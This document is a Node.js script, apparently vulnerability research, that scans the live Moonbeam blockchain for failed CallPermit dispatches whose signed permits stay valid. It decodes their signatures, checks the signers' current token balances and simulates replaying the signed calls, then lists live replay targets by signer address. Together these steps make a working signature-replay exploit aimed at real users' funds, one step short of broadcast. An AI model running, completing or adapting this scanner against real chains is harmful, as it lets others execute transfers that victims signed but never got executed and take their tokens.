// Scan failed CallPermit dispatches where subcall reverted due to insufficient balance
// Targets: DPS buyVoyages (TMAP), ERC-20 transfer, MoonBeans marketplace
"use strict";

const fs = require("fs");

const CALLPERMIT = "0x000000000000000000000000000000000000080a";
const DISPATCH_SEL = "0xb5ea0966";

const DPS       = "0xd1a9ba3e61ac676f58b29ea0a09cf5d7f4f35138";
const TMAP      = "0x0e67601818237834fF8A280312a6F4F4934e6283";
const MOONBEANS = "0x683724817a7d526d6256aec0d6f8ddf541b924de";

const BUYVOYAGES_SEL = "0xdb76d5b3";
const TRANSFER_SEL   = "0xa9059cbb";
const TRANSFERFROM_SEL = "0x23b872dd";
const ACCEPT_OFFER_SEL = "0x4b29e822"; // acceptOffer
const FULFILL_SEL      = "0x47d9bed9"; // fulfillListing

const FINANCIAL_SELS = new Set([
  BUYVOYAGES_SEL, TRANSFER_SEL, TRANSFERFROM_SEL,
  ACCEPT_OFFER_SEL, FULFILL_SEL,
  "0x095ea7b3", // approve
  "0x2e1a7d4d", // withdraw
  "0x4e71d92d", // claim
]);

const RPCS = [
  "https://rpc.api.moonbeam.network",
  "https://moonbeam-rpc.publicnode.com",
  "https://moonbeam.api.onfinality.io/public",
  "https://moonbeam.unitedbloc.com",
];

const sleep = ms => new Promise(r => setTimeout(r, ms));

let rpcIndex = 0;
function nextRpc() { return RPCS[rpcIndex++ % RPCS.length]; }

async function call(method, params, attempt = 0) {
  const url = nextRpc();
  try {
    const res = await fetch(url, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ jsonrpc: "2.0", id: 1, method, params }),
    });
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    const body = await res.json();
    if (body.error) throw new Error(JSON.stringify(body.error));
    return body.result;
  } catch (e) {
    if (attempt >= 4) throw e;
    await sleep(600 * (attempt + 1));
    return call(method, params, attempt + 1);
  }
}

async function batchCall(reqs, attempt = 0) {
  const url = nextRpc();
  try {
    const res = await fetch(url, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify(reqs.map((r, i) => ({ jsonrpc: "2.0", id: i, ...r }))),
    });
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    const body = await res.json();
    if (!Array.isArray(body)) throw new Error(JSON.stringify(body).slice(0, 300));
    body.sort((a, b) => a.id - b.id);
    return body.map(x => {
      if (x.error) return null;
      return x.result;
    });
  } catch (e) {
    if (attempt >= 3) return null;
    await sleep(800 * (attempt + 1));
    return batchCall(reqs, attempt + 1);
  }
}

function hx(n) { return "0x" + BigInt(n).toString(16); }
function pad(addr) { return addr.replace("0x", "").padStart(64, "0"); }

async function ethCall(to, data, blockHex) {
  try {
    return await call("eth_call", [{ to, data }, blockHex]);
  } catch { return null; }
}

async function getBalance(token, addr, blockHex) {
  const data = "0x70a08231" + pad(addr);
  const r = await ethCall(token, data, blockHex);
  if (!r || r === "0x") return 0n;
  return BigInt(r);
}

async function getNonce(signer, blockHex) {
  const data = "0x7ecebe00" + pad(signer);
  const r = await ethCall(CALLPERMIT, data, blockHex);
  if (!r || r === "0x") return null;
  return BigInt(r);
}

function decodeDispatch(input) {
  // dispatch(address from, address to, uint256 value, bytes data, uint64 gaslimit, uint256 deadline, uint8 v, bytes32 r, bytes32 s)
  if (!input || !input.startsWith(DISPATCH_SEL)) return null;
  try {
    const d = input.slice(10); // strip selector
    const from     = "0x" + d.slice(24, 64);
    const to       = "0x" + d.slice(88, 128);
    const value    = BigInt("0x" + d.slice(128, 192));
    // bytes data: offset at word 3 (192..256), length at offset*2
    const dataOff  = parseInt(d.slice(192, 256), 16) * 2;
    const dataLen  = parseInt(d.slice(dataOff, dataOff + 64), 16) * 2;
    const innerData = "0x" + d.slice(dataOff + 64, dataOff + 64 + dataLen);
    // gaslimit at word 4 (256..320)
    const gaslimit = BigInt("0x" + d.slice(256, 320));
    // deadline at word 5 (320..384)
    const deadline = BigInt("0x" + d.slice(320, 384));
    // v at word 6, r at 7, s at 8
    const v        = Number("0x" + d.slice(384, 448));
    const r        = "0x" + d.slice(448, 512);
    const s        = "0x" + d.slice(512, 576);
    return { from: from.toLowerCase(), to: to.toLowerCase(), value, innerData, gaslimit, deadline, v, r, s };
  } catch { return null; }
}

async function scanRange(startBlock, endBlock, batchSize = 200) {
  const candidates = [];
  for (let b = endBlock; b >= startBlock; b -= batchSize) {
    const batchStart = Math.max(b - batchSize + 1, startBlock);
    const blocks = [];
    for (let i = batchStart; i <= b; i++) blocks.push(i);

    const reqs = blocks.map(bn => ({ method: "eth_getBlockReceipts", params: [hx(bn)] }));
    const results = await batchCall(reqs);

    if (!results) {
      // fallback: one by one
      for (const bn of blocks) {
        try {
          const receipts = await call("eth_getBlockReceipts", [hx(bn)]);
          if (receipts) processReceipts(receipts, bn, candidates);
        } catch { }
      }
      continue;
    }

    for (let i = 0; i < results.length; i++) {
      const receipts = results[i];
      if (!receipts) continue;
      processReceipts(receipts, blocks[i], candidates);
    }

    if (b % 10000 === 0 || (endBlock - b) % 50000 === 0) {
      console.log(`[scan] block ${b}, found ${candidates.length} raw candidates`);
    }
  }
  return candidates;
}

function processReceipts(receipts, blockNum, candidates) {
  for (const r of receipts) {
    if (!r.to || r.to.toLowerCase() !== CALLPERMIT) continue;
    if (r.status !== "0x0") continue;
    if (!r.input || !r.input.startsWith(DISPATCH_SEL)) continue;

    const decoded = decodeDispatch(r.input);
    if (!decoded) continue;

    const { from, to, innerData } = decoded;
    const innerSel = innerData.slice(0, 10).toLowerCase();

    const isDPS      = to === DPS;
    const isMoonBeans = to === MOONBEANS;
    const isFinancial = FINANCIAL_SELS.has(innerSel);
    const isTransfer  = innerSel === TRANSFER_SEL || innerSel === TRANSFERFROM_SEL;

    if (!isDPS && !isMoonBeans && !isFinancial && !isTransfer) continue;

    candidates.push({
      txHash: r.transactionHash,
      blockNum,
      blockHex: hx(blockNum),
      signer: from,
      target: to,
      innerSel,
      innerData,
      deadline: Number(decoded.deadline),
      v: decoded.v,
      r: decoded.r,
      s: decoded.s,
      isDPS,
      isMoonBeans,
      input: r.input,
    });
  }
}

async function analyzeCandidate(c) {
  const blockHex = hx(c.blockNum);
  const blockPrevHex = hx(c.blockNum - 1);

  // Token to check balance for
  let tokenAddr = null;
  if (c.isDPS) {
    tokenAddr = TMAP;
  } else if (c.innerSel === TRANSFER_SEL || c.innerSel === TRANSFERFROM_SEL) {
    tokenAddr = c.target; // target IS the token
  } else if (c.innerSel === BUYVOYAGES_SEL) {
    tokenAddr = TMAP;
  }

  const [nonceBefore, nonceAfter, nonceNow] = await Promise.all([
    getNonce(c.signer, blockPrevHex),
    getNonce(c.signer, blockHex),
    getNonce(c.signer, "latest"),
  ]);

  const nonceRolledBack = nonceBefore !== null && nonceAfter !== null && nonceBefore === nonceAfter;

  let balBefore = null, balAtBlock = null, balNow = null;
  if (tokenAddr) {
    [balBefore, balAtBlock, balNow] = await Promise.all([
      getBalance(tokenAddr, c.signer, blockPrevHex),
      getBalance(tokenAddr, c.signer, blockHex),
      getBalance(tokenAddr, c.signer, "latest"),
    ]);
  }

  const deadlineExpired = Date.now() / 1000 > c.deadline;
  const nonceConsumed = nonceNow !== null && nonceBefore !== null && nonceNow > nonceBefore;
  const liveReplay = nonceRolledBack && !nonceConsumed && !deadlineExpired && (balNow === null || balNow > 0n);

  // Simulate replay if nonce still valid
  let simResult = null;
  if (nonceRolledBack && !nonceConsumed) {
    try {
      const r = await call("eth_call", [{
        to: CALLPERMIT,
        data: c.input,
        from: "0x000000000000000000000000000000000000dead",
      }, "latest"]);
      simResult = r === "0x01" ? "SUCCESS" : (r ? `RESULT:${r}` : "EMPTY");
    } catch (e) {
      simResult = `REVERT: ${e.message?.slice(0, 120)}`;
    }
  }

  return {
    ...c,
    nonceBefore: nonceBefore?.toString() ?? null,
    nonceAfter:  nonceAfter?.toString()  ?? null,
    nonceNow:    nonceNow?.toString()    ?? null,
    nonceRolledBack,
    nonceConsumed,
    tokenAddr,
    balBefore:  balBefore?.toString()  ?? null,
    balAtBlock: balAtBlock?.toString() ?? null,
    balNow:     balNow?.toString()     ?? null,
    deadlineExpired,
    deadlineHuman: new Date(c.deadline * 1000).toISOString(),
    liveReplay,
    simResult,
  };
}

async function main() {
  const currentBlock = parseInt(await call("eth_blockNumber", []), 16);
  console.log(`[main] current block: ${currentBlock}`);

  // Scan ranges: DPS was deployed early, scan wide range
  // Recent 500k blocks
  const START = currentBlock - 500000;
  const END   = currentBlock;

  console.log(`[scan] ${START} → ${END} (500k blocks)`);

  const raw = await scanRange(START, END, 200);
  console.log(`[scan] raw candidates: ${raw.length}`);

  if (raw.length === 0) {
    console.log("[scan] no candidates found in recent 500k blocks");
    console.log("[scan] DPS may have low activity. Checking DPS deployment block...");
    // Save empty result
    fs.writeFileSync("research/insufficient_balance_replay_report.json",
      JSON.stringify({ scanned: { start: START, end: END }, candidates: [] }, null, 2));
    return;
  }

  console.log(`[analyze] checking ${raw.length} candidates...`);
  const analyzed = [];
  for (const c of raw) {
    try {
      const result = await analyzeCandidate(c);
      analyzed.push(result);
      const tag = result.liveReplay ? "🔴 LIVE" :
                  (result.nonceRolledBack && !result.nonceConsumed) ? "🟡 OPEN" :
                  result.nonceRolledBack ? "🟢 HISTORICAL" : "⚪ NO_ROLLBACK";
      console.log(`${tag} ${result.txHash} | block ${result.blockNum} | target ${result.target} | sel ${result.innerSel}`);
      if (result.balBefore !== null) {
        const fmt = v => v ? (BigInt(v) / 10n**18n).toString() + " tokens" : "0";
        console.log(`       TMAP: before=${fmt(result.balBefore)} atBlock=${fmt(result.balAtBlock)} now=${fmt(result.balNow)}`);
      }
      if (result.simResult) console.log(`       sim: ${result.simResult}`);
    } catch (e) {
      console.error(`[analyze] error on ${c.txHash}: ${e.message}`);
    }
    await sleep(100);
  }

  fs.writeFileSync("research/insufficient_balance_replay_report.json",
    JSON.stringify({ scanned: { start: START, end: END }, candidates: analyzed }, null, 2));

  const live       = analyzed.filter(x => x.liveReplay);
  const open       = analyzed.filter(x => x.nonceRolledBack && !x.nonceConsumed && !x.liveReplay);
  const historical = analyzed.filter(x => x.nonceRolledBack && x.nonceConsumed);

  console.log("\n=== RESULTS ===");
  console.log(`Live replay possible: ${live.length}`);
  console.log(`Window open (deadline expired or no balance): ${open.length}`);
  console.log(`Historical (nonce consumed): ${historical.length}`);
  console.log(`Total analyzed: ${analyzed.length}`);

  if (live.length > 0) {
    console.log("\n🔴 LIVE REPLAY CANDIDATES:");
    for (const c of live) {
      console.log(`  ${c.txHash} | signer ${c.signer} | deadline ${c.deadlineHuman}`);
      console.log(`  TMAP now: ${c.balNow ? BigInt(c.balNow) / 10n**18n : 0}  sim: ${c.simResult}`);
    }
  }

  console.log("\nSaved: research/insufficient_balance_replay_report.json");
}

main().catch(e => { console.error("FATAL:", e); process.exit(1); });
